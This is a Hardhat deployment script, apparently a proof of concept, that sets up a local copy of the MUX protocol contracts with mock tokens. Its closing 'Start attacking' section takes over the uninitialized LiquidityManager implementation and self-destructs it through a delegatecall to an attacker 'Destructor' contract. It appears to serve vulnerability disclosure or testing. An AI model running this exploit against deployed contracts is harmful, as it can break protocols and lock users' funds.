
/* This script is based on mux protocol deploy file */

import hre, { ethers } from "hardhat"
import { restorableEnviron } from "./deployer/environ"
import { toWei, toUnit, toBytes32, rate, ensureFinished, ReferenceOracleType } from "../test/deployUtils"
import { Deployer, DeploymentOptions } from "./deployer/deployer"
import { LiquidityPool, OrderBook, LiquidityManager, Reader, NativeUnwrapper } from "../typechain"
import { MuxToken, MlpToken, MockERC20 } from "../typechain"
import { Contract, ContractReceipt } from "ethers"
// import { transferThroughDemoBridge } from "./demoBridgeTransfer"
import { Vault } from "../typechain/Vault"
import { expect } from "chai"

const TOKEN_POSTFIX = "0328"
const keeperAddress = "0xc6b1458fcc02abc7f3d912fa60c7fb59c957fbf0"

const ENV: DeploymentOptions = {
  network: hre.network.name,
  artifactDirectory: "./artifacts/contracts",
  addressOverride: {
    // ArbRinkeby
    ProxyAdmin: { address: "0x1D34658aD1259F515246335A11372Fe51330999d" },
    WETH9: { address: "0xB47e6A5f8b33b3F17603C83a0535A9dcD7E32681" },
    DemoBridge: { address: "0x505F6EB30251097929c6a89d89F812A270bb098b" },
  },
}

async function faucet(deployer: Deployer) {
  const accounts = await ethers.getSigners()
  console.log("faucet")
  const usdc: MockERC20 = await deployer.deployOrSkip("MockERC20", "MockUsdc", "USD Coin", "USDC", 6) // https://etherscan.io/token/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48
  const usdt: MockERC20 = await deployer.deployOrSkip("MockERC20", "MockUsdt", "Tether USD", "USDT", 6) // https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7
  const dai: MockERC20 = await deployer.deployOrSkip("MockERC20", "MockDai", "Dai Stablecoin", "DAI", 18) // https://etherscan.io/token/0x6b175474e89094c44da98b954eedeac495271d0f
  const wbtc: MockERC20 = await deployer.deployOrSkip("MockERC20", "MockWbtc", "Wrapped BTC", "WBTC", 8) // https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599
  const ftm: MockERC20 = await deployer.deployOrSkip("MockERC20", "MockFtm", "Fantom Token", "FTM", 18) // https://etherscan.io/token/0x4e15361fd6b4bb609fa63c81a2be19d873717870
  const link: MockERC20 = await deployer.deployOrSkip("MockERC20", "MockLink", "ChainLink Token", "LINK", 18) // https://etherscan.io/token/0x514910771af9ca656af840dff83e8264ecf986ca
  for (let a of [
    // "0xba893CfA648f46F92a29911589f1A353b6AA4938", // t1
  ]) {
    console.log("to", a)
    await usdc.mint(a, toUnit("200000", 6))
    await usdt.mint(a, toUnit("200000", 6))
    await dai.mint(a, toWei("200000"))
    await wbtc.mint(a, toUnit("4", 8))
    await ftm.mint(a, toWei("200000"))
    await link.mint(a, toWei("10000"))
  }
}

async function preset1(deployer: Deployer) {
  console.log("preset1")
  const accounts = await ethers.getSigners()
  const pool: LiquidityPool = await deployer.getDeployedContract("LiquidityPool", "LiquidityPool")
  const orderBook: OrderBook = await deployer.getDeployedContract("OrderBook", "OrderBook")
  const liquidityManager: LiquidityManager = await deployer.getDeployedContract("LiquidityManager", "LiquidityManager")

  // deploy
  const weth9: MockERC20 = await deployer.getDeployedContract("MockERC20", "WETH9")
  const usdc: MockERC20 = await deployer.getDeployedContract("MockERC20", "MockUsdc")
  const usdt: MockERC20 = await deployer.getDeployedContract("MockERC20", "MockUsdt")
  const dai: MockERC20 = await deployer.getDeployedContract("MockERC20", "MockDai")
  const wbtc: MockERC20 = await deployer.getDeployedContract("MockERC20", "MockWbtc")
  const ftm: MockERC20 = await deployer.getDeployedContract("MockERC20", "MockFtm")
  const link: MockERC20 = await deployer.getDeployedContract("MockERC20", "MockLink")
  const muxUsd: MuxToken = await deployer.getDeployedContract("MuxToken", "MuxUsd")
  const muxWeth: MuxToken = await deployer.getDeployedContract("MuxToken", "MuxWeth")
  const muxWbtc: MuxToken = await deployer.deployOrSkip("MuxToken", "MuxWbtc")
  const muxFtm: MuxToken = await deployer.deployOrSkip("MuxToken", "MuxFtm")
  const muxAvax: MuxToken = await deployer.deployOrSkip("MuxToken", "MuxAvax")
  const muxLink: MuxToken = await deployer.deployOrSkip("MuxToken", "MuxLink")

  console.log("init tokens")
  await muxWbtc.initialize("MUX Token for WBTC", "muxWBTC" + TOKEN_POSTFIX)
  await muxAvax.initialize("MUX Token for AVAX", "muxAVAX" + TOKEN_POSTFIX)
  await muxLink.initialize("MUX Token for LINK", "muxLINK" + TOKEN_POSTFIX)

  console.log("transfer mux")
  console.log("add stable coins")
  // id, symbol, decimals, stable, token, mux
  await ensureFinished(pool.addAsset(0, toBytes32("USDC"), 6, true, usdc.address, muxUsd.address))
  await ensureFinished(pool.addAsset(1, toBytes32("USDT"), 6, true, usdt.address, muxUsd.address))
  await ensureFinished(pool.addAsset(2, toBytes32("DAI"), 18, true, dai.address, muxUsd.address))
  // id, symbol, imr, mmr, fee, fee, minBps, minTime, maxLong, maxShort, spotWeight, halfSpread
  await pool.setAssetParams(0, toBytes32("USDC"), rate("0"), rate("0"), rate("0"), rate("0"), rate("0"), 0, toWei("0"), toWei("0"), 1, rate("0"))
  await pool.setAssetParams(1, toBytes32("USDT"), rate("0"), rate("0"), rate("0"), rate("0"), rate("0"), 0, toWei("0"), toWei("0"), 1, rate("0"))
  await pool.setAssetParams(2, toBytes32("DAI"), rate("0"), rate("0"), rate("0"), rate("0"), rate("0"), 0, toWei("0"), toWei("0"), 1, rate("0"))
  for (let tokenId = 0; tokenId < 3; tokenId++) {
    console.log("set stable coin", tokenId)

    // id, tradable, openable, shortable, useStable, enabled, strict, liq
    await pool.setAssetFlags(tokenId, false, false, false, false, true, true, true)
    await pool.setFundingParams(tokenId, rate("0.00011"), rate("0.0008"))
  }

  // ----------------------------------------------------------------------------------

  console.log("add other coins")
  // id, symbol, decimals, stable, token, mux
  await ensureFinished(pool.addAsset(3, toBytes32("ETH"), 18, false, weth9.address, muxWeth.address))
  await ensureFinished(pool.addAsset(4, toBytes32("BTC"), 8, false, wbtc.address, muxWbtc.address))
  await ensureFinished(pool.addAsset(5, toBytes32("FTM"), 18, false, ftm.address, muxFtm.address))
  await ensureFinished(pool.addAsset(6, toBytes32("AVAX"), 18, false, "0x0000000000000000000000000000000000000000", muxAvax.address))
  await ensureFinished(pool.addAsset(7, toBytes32("LINK"), 18, false, link.address, muxLink.address))
  // id, symbol, imr, mmr, fee, fee, minBps, minTime, maxLong, maxShort, spotWeight, halfSpread
  await pool.setAssetParams(3, toBytes32("ETH"), rate("0.006"), rate("0.005"), rate("0.001"), rate("0.005"), rate("0.001"), 60, toWei("1000000"), toWei("1000000"), 2, rate("0"))
  await pool.setAssetParams(4, toBytes32("BTC"), rate("0.006"), rate("0.005"), rate("0.001"), rate("0.005"), rate("0.001"), 60, toWei("1000000"), toWei("1000000"), 2, rate("0"))
  await pool.setAssetParams(5, toBytes32("FTM"), rate("0.006"), rate("0.005"), rate("0.001"), rate("0.005"), rate("0.001"), 60, toWei("1000000"), toWei("1000000"), 2, rate("0.0012"))
  await pool.setAssetParams(6, toBytes32("AVAX"), rate("0.006"), rate("0.005"), rate("0.001"), rate("0.005"), rate("0.001"), 60, toWei("1000000"), toWei("1000000"), 2, rate("0.0012"))
  await pool.setAssetParams(7, toBytes32("LINK"), rate("0.006"), rate("0.005"), rate("0.001"), rate("0.005"), rate("0.001"), 60, toWei("1000000"), toWei("1000000"), 2, rate("0"))
  for (let tokenId = 3; tokenId < 8; tokenId++) {
    console.log("set other coins", tokenId)

    let useStable = false
    if (tokenId === 6 /* avax */) {
      useStable = true
    }
    // id, tradable, openable, shortable, useStable, enabled, strict, liq
    await pool.setAssetFlags(tokenId, true, true, true, useStable, true, false, true)

    await pool.setFundingParams(tokenId, rate("0.0001"), rate("0.0008"))
  }

  // ----------------------------------------------------------------------------------

  console.log("reference oracle")

  console.log("add dex - weth-usdc")
  await liquidityManager.addDexSpotConfiguration(1, 0, 100, [1], [1])
}

async function addLiq(deployer: Deployer) {
  const accounts = await ethers.getSigners()
  const lp1 = accounts[2]

  const pool: LiquidityPool = await deployer.getDeployedContract("LiquidityPool", "LiquidityPool")
  const orderBook: OrderBook = await deployer.getDeployedContract("OrderBook", "OrderBook")
  const liquidityManager: LiquidityManager = await deployer.getDeployedContract("LiquidityManager", "LiquidityManager")

  // deploy
  const weth9: MockERC20 = await deployer.getDeployedContract("MockERC20", "WETH9")
  const usdc: MockERC20 = await deployer.getDeployedContract("MockERC20", "MockUsdc")
  const usdt: MockERC20 = await deployer.getDeployedContract("MockERC20", "MockUsdt")
  const dai: MockERC20 = await deployer.getDeployedContract("MockERC20", "MockDai")
  const wbtc: MockERC20 = await deployer.getDeployedContract("MockERC20", "MockWbtc")
  const link: MockERC20 = await deployer.getDeployedContract("MockERC20", "MockLink")
  const muxUsd: MuxToken = await deployer.getDeployedContract("MuxToken", "MuxUsd")
  const muxWeth: MuxToken = await deployer.getDeployedContract("MuxToken", "MuxWeth")
  const muxWbtc: MuxToken = await deployer.getDeployedContract("MuxToken", "MuxWbtc")
  const muxFtm: MuxToken = await deployer.getDeployedContract("MuxToken", "MuxFtm")
  const muxAvax: MuxToken = await deployer.getDeployedContract("MuxToken", "MuxAvax")
  const muxLink: MuxToken = await deployer.getDeployedContract("MuxToken", "MuxLink")

  console.log("temporarily close liquidity lock (test only)")
  await orderBook.setLiquidityLockPeriod(0)

  console.log("recovery liquidity lock (test only)")
  await orderBook.setLiquidityLockPeriod(5 * 60)
}

function getOrderId(receipt: ContractReceipt): string {
  let orderId = "0"
  for (let event of receipt.events!) {
    if (event.event === "NewLiquidityOrder") {
      orderId = event.args!.orderId.toString()
      console.log("orderId:", orderId)
    }
  }
  return orderId
}


async function main(deployer: Deployer) {
  const accounts = await ethers.getSigners()
  if (accounts.length < 3) {
    throw new Error("this script needs 3 accounts: deployer, broker, lp")
  }

  // deploy
  let proxyAdmin = deployer.addressOf("ProxyAdmin")
  const weth9: MockERC20 = await deployer.getDeployedContract("MockERC20", "WETH9")
  const mlpToken: MlpToken = await deployer.deployUpgradeableOrSkip("MlpToken", "Mlp", proxyAdmin)
  await deployer.deployUpgradeableOrSkip("LiquidityPoolHop1", "LiquidityPool", proxyAdmin)
  const poolHop2: Contract = await deployer.deployOrSkip("LiquidityPoolHop2", "LiquidityPoolHop2")
  const pool: LiquidityPool = await deployer.getDeployedContract("LiquidityPool", "LiquidityPool")
  const orderBook: OrderBook = await deployer.deployUpgradeableOrSkip("OrderBook", "OrderBook", proxyAdmin)
  await deployer.deployUpgradeableOrSkip("LiquidityManager", "LiquidityManager", proxyAdmin)
  const liquidityManager = await deployer.getDeployedContract("LiquidityManager", "LiquidityManager")
  const reader: Reader = await deployer.deployOrSkip("Reader", "Reader", pool.address, mlpToken.address, liquidityManager.address, orderBook.address, [
    accounts[0].address, // deployer's mux tokens are not debt
  ])
  const nativeUnwrapper: NativeUnwrapper = await deployer.deployOrSkip("NativeUnwrapper", "NativeUnwrapper", weth9.address)
  const vault: Vault = await deployer.deployUpgradeableOrSkip("Vault", "Vault", proxyAdmin)
  const muxUsd: MuxToken = await deployer.deployOrSkip("MuxToken", "MuxUsd")
  const muxWeth: MuxToken = await deployer.deployOrSkip("MuxToken", "MuxWeth")

  // init
  console.log("init")
  await ensureFinished(mlpToken.initialize("MUX LP", "MUXLP" + TOKEN_POSTFIX))
  await ensureFinished(muxUsd.initialize("MUX Token for USD", "muxUSD" + TOKEN_POSTFIX))
  await ensureFinished(muxWeth.initialize("MUX Token for WETH", "muxWETH" + TOKEN_POSTFIX))
  await ensureFinished(pool.initialize(poolHop2.address, mlpToken.address, orderBook.address, liquidityManager.address, weth9.address, nativeUnwrapper.address, vault.address))
  await ensureFinished(orderBook.initialize(pool.address, mlpToken.address, weth9.address, nativeUnwrapper.address))
  await orderBook.addBroker(accounts[1].address)
  await orderBook.addBroker(keeperAddress)
  await orderBook.setLiquidityLockPeriod(5 * 60)
  await orderBook.setOrderTimeout(300, 86400 * 365)
  await ensureFinished(liquidityManager.initialize(vault.address, pool.address))
  // fundingInterval, liqBase, liqDyn, σ_strict, brokerGas
  await pool.setNumbers(3600 * 8, rate("0.0025"), rate("0.005"), rate("0.01"), toWei("0"))
  // mlpPrice, mlpPrice
  await pool.setEmergencyNumbers(toWei("0.5"), toWei("1.1"))
  await ensureFinished(nativeUnwrapper.addWhiteList(pool.address))
  await ensureFinished(nativeUnwrapper.addWhiteList(orderBook.address))
  await ensureFinished(vault.initialize())

  // presets
  
  await faucet(deployer)
  await preset1(deployer)
  await addLiq(deployer)


  // actual part of start attacking
  console.log("=== Start attacking ===")
  const user1 = accounts[4];
  const lm_impl_addr = deployer.deployedContracts['LiquidityManager__implementation']['address']
  const lm_impl = await deployer.getContractAt('LiquidityManager', lm_impl_addr)
  
  console.log("Deploy attacker's destructor contract")
  const Destructor = await ethers.getContractFactory('Destructor', user1)
  const destructor = await Destructor.deploy()
  await destructor.deployed()

  
  console.log("Call initialize of LiquidityManager__implementation")
  await ensureFinished(lm_impl.connect(user1).initialize(vault.address, pool.address))
  await ensureFinished(lm_impl.connect(user1).addDexSpotConfiguration(1, 0, 100, [1], [1]))

  console.log("Call setDexWrapper of LiquidityManager__implementation to delegatecall")
  await ensureFinished(await lm_impl.connect(user1).setDexWrapper(1, destructor.address, "0x00"))

  console.log("Checks whether LiquidityManager__implementation is destroyed...")
  expect(await ethers.provider.getCode(lm_impl_addr)).to.equal("0x")
  console.log("Succesfully LiquidityManager__implementation is destroyed!")
}

restorableEnviron(ENV, main)
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
